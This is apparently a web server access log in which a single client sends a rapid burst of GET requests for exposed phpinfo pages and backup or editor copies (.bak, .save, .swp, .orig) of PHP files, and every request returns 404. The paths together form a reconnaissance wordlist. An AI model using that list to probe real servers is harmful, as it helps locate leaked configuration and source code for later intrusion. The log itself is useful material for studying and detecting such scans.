043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:10;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:11;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:12;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:14;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:15;;/www/info.php;GET;404
